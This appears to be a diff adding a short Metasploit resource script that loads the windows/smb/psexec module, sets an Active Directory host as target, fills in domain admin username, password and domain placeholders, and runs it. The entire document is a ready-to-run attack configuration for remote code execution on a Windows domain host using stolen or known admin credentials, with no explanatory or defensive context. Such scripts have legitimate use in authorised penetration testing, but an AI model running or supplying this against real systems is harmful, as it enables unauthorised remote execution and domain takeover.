@@ -1,0 +1,6 @@
+use exploit/windows/smb/psexec
+set RHOSTS {IP odf AD}
+set SMBDomain {your domain name}
+set SMBPass {your domain admin password}
+set SMBUser {your domain admin username}
+run
